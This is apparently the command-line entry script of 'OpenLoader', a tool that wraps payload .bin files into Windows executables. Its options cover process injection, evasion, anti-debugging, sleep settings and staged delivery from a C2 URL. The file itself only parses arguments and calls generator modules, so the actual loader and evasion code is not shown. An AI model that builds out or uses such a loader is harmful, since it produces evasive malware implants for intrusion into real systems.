#!/usr/bin/env python3
import argparse
import sys
from pathlib import Path
from core.config_parser import (
    Profile, PayloadConfig, PEConfig, SectionPerm,
    InjectionConfig, EvasionConfig, AntiDebugConfig,
    SleepConfig, CompilerConfig, OutputConfig, parse_file,
)
from generators.stageless import StagelessGenerator
from generators.staged import StagedGenerator
from utils.helpers import colored_print, file_checksum


def _minimal_profile(payload_path: str) -> Profile:
    return Profile(
        meta_name="Agent",
        meta_ver="1.0",
        payload=PayloadConfig(kind="stageless", file=payload_path),
        pe=PEConfig(sections=SectionPerm()),
        injection=InjectionConfig(),
        evasion=EvasionConfig(),
        anti_debug=AntiDebugConfig(),
        sleep=SleepConfig(),
        compiler=CompilerConfig(),
        output=OutputConfig(path="output/agent.exe", type="exe"),
        extensions=[],
    )


def main():
    parser = argparse.ArgumentParser(
        description="OpenLoader v1.0 — profile-driven PE loader. One JSON to rule them all: injection, evasion, permissions, extensions. Every knob exposed.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Examples:
  openloader -c profile.json              # tune everything via JSON
  openloader --payload ifrit.bin          # stageless in one command
  openloader -c staged.json               # staged with C2 URL
        """,
    )
    parser.add_argument("-c", "--config", help="Path to profile JSON")
    parser.add_argument("-p", "--payload", help="Payload .bin file (stageless quick mode)")
    parser.add_argument("-o", "--output", help="Output file path (overrides config)")
    args = parser.parse_args()

    colored_print("""
  \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557
  \u2551        OpenLoader v1.0               \u2551
  \u2551  One JSON. Every knob. Zero guesswork.\u2551
  \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d
    """, "cyan")

    if args.config:
        colored_print(f"[+] Loading profile: {args.config}", "green")
        profile = parse_file(args.config)
    elif args.payload:
        colored_print(f"[+] Quick stageless mode \u2014 payload: {args.payload}", "green")
        profile = _minimal_profile(args.payload)
    else:
        colored_print("[-] Use -c <profile.json> or --payload <payload.bin>", "red")
        sys.exit(1)

    if args.output:
        profile.output.path = args.output

    if profile.payload.kind == "stageless":
        gen = StagelessGenerator(profile)
    elif profile.payload.kind == "staged":
        gen = StagedGenerator(profile)
    else:
        colored_print(f"[-] Unknown loader type: {profile.payload.kind}", "red")
        sys.exit(1)

    output = gen.generate()
    if output:
        cs = file_checksum(output)
        colored_print(f"[+] SUCCESS: {output}", "green")
        colored_print(f"    SHA256: {cs}", "cyan")
    else:
        colored_print("[-] Generation failed", "red")
        sys.exit(1)


if __name__ == "__main__":
    main()
